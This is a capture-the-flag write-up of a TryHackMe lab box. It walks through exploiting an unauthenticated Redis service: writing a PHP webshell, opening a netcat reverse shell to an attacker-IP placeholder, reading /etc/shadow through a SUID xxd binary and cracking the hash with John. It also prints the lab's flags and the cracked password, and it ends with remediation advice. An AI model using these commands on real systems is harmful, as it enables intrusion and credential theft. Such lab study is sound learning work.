# Res Room (2025) — Write-up

**Author:** Daniel Demian  
**Room:** [Res (TryHackMe)](https://tryhackme.com/room/res) 
**Difficulty:** Easy 🟢 
**Time to Complete:** ~30 minutes

---

## Summary

A compact, beginner-friendly box that highlights standard Linux enumeration and basic privilege escalation techniques. The exercise focuses on service discovery (redis + HTTP), achieving remote code execution against Redis to obtain an initial shell, local enumeration to find credentials, and a simple file-based privilege escalation using an unexpected SUID binary (`xxd`). This write-up documents the steps taken, commands used, and final remediation notes.

---

## Quick TL;DR

- **Initial access:** Redis RCE (no authentication) and a PHP webshell.
    
- **User:** Switched to `vianka` after discovering/cracking a hashed password.
    
- **Privilege escalation:** Used SUID `xxd` to read `/etc/shadow`, cracked the hash with John, and obtained `root.txt`.

---

## Recon & Enumeration

**Nmap scan (full TCP, service/version detection):**

```bash
nmap -p- -sC -sV -T4 {TARGET_IP} -oA scans/full_tcp
```

**Representative output:**

```
Nmap 7.80 scan initiated Sat Oct  4 14:12:27 2025 as: nmap -oA /tmp/scans/scan -p- -sC -sV 10.10.153.213
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.153.213
Host is up (0.00027s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6379/tcp open  redis   Redis key-value store 6.0.7
MAC Address: 02:08:F1:6B:28:D1 (Unknown)
```

**Quick answers (from enumeration):**

- How many ports are open? **2**
    
- DBMS installed? **Redis**
    
- Redis port? **6379**
    
- Redis version? **6.0.7**

---

## Initial Access — Redis RCE

Redis was exposed and allowed configuration writes. Using `redis-cli` we can write a PHP webshell into the webroot and trigger it via HTTP.

**Tools used:** `redis-tools` (for `redis-cli`), a web browser, and `nc` for a listener. [Resource](https://hackviser.com/tactics/pentesting/services/redis)

**Commands executed:**

```bash
# install client on attacker VM if needed
sudo apt update && sudo apt install -y redis-tools

# connect to redis on target
redis-cli -h {TARGET_IP}

# inside redis-cli
flushall
set pwn "<?php system($_REQUEST['cmd']); ?>"
config set dbfilename webshell.php
config set dir /var/www/html
save
```

After saving, the webshell is available at `http://{TARGET_IP}/webshell.php`.

**Get a reverse shell (example using netcat):**

1. Start listener on attacker:
    

```bash
nc -nlvp 1234
```

2. Trigger webshell from browser (replace `{ATTACKER_IP}` and port):
    

```
http://{TARGET_IP}/webshell.php?cmd=nc%20{ATTACKER_IP}%201234%20-e%20/bin/bash
```

3. Upgrade the shell on the target:
    

```bash
python3 -c 'import pty, os; pty.spawn("/bin/bash")'
# local: stty raw -echo; fg
export TERM=xterm-256color
reset
```

**Result:** read `user.txt`:

```bash
cat /home/vianka/user.txt
# thm{red1s_rce_w1thout_credent1als}
```

---

## Privilege Escalation — Reading /etc/shadow with `xxd`

`/etc/shadow` was not directly readable by the current account. Using the SUID `xxd` binary we can dump the hex of `/etc/shadow` and reconstruct it as a readable file. [Resource](https://gtfobins.github.io/gtfobins/xxd/#suid)

**Pattern used (lab-only, defensive learning):**

```bash
LFILE=/etc/shadow
xxd "$LFILE" | xxd -r > /tmp/shadow
cat /tmp/shadow | sed -n '1,10p'
```

**Notes:**

- The reconstructed `/tmp/shadow` contained a hash for `vianka` starting with `$6$`, which indicates **sha512crypt**.
    
- Identify format quickly by the `$` prefix: `$6$`=sha512, `$5$`=sha256, `$1$`=md5, `$2y$`/`$2a$`=bcrypt.
    

**Transfer to attacker (one convenient option):**  
On the target (serve `/tmp`):

```bash
cd /tmp
python3 -m http.server 8000
```

On attacker:

```bash
wget http://{TARGET_IP}:8000/shadow
wget http://{TARGET_IP}:8000/passwd
```

**Merge and crack:**

```bash
unshadow passwd shadow > hashes
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes
# output showed: beautiful1 (vianka)
john --show hashes
```

**Result:** cracked password for `vianka`: **beautiful1**

---

## Switching to `vianka` and final escalation

With the cracked password:

```bash
su - vianka
# enter password: beautiful1

# check sudo
sudo -l
# escalate if allowed
sudo su -
cat /root/root.txt
# thm{xxd_pr1v_escalat1on}
```

This completed the box: initial RCE on Redis → user flag → SUID `xxd` to read shadow → crack hash → switch to user → sudo to root.

---

## Final Thoughts & Lessons Learned

- **Service exposure matters:** an unauthenticated Redis instance led directly to RCE by writing a webshell to the document root. Never expose management services to untrusted networks.
    
- **Audit SUID binaries:** non-essential SUID programs (like `xxd`) are dangerous — remove the SUID bit unless strictly required.
    
- **Password hygiene & hashing:** even with `sha512crypt` and salt, weak passwords (e.g., `beautiful1`) are often cracked quickly with common wordlists. Enforce stronger passwords and consider additional protections (MFA).    

---

## Answers (quick list)

- How many ports are open?: **2**
    
- DBMS installed on the server?: **Redis**
    
- Redis port?: **6379**
    
- Redis version?: **6.0.7**
    
- Compromise machine & locate user.txt?: `thm{red1s_rce_w1thout_credent1als}`
    
- What is the local user account password?: `beautiful1`
    
- Escalate privileges & obtain root.txt?: `thm{xxd_pr1v_escalat1on}`
    

---

## Remediation Recommendations

1. Do not expose management services (Redis) directly to untrusted networks; require authentication and network access controls.
    
2. Remove SUID from unnecessary binaries: `chmod u-s /usr/bin/xxd` (or audit and restrict access).
    
3. Use strong password policies and enforce multi-factor authentication where possible.
    
4. Regularly scan for insecure service deployments and unexpected file permissions.
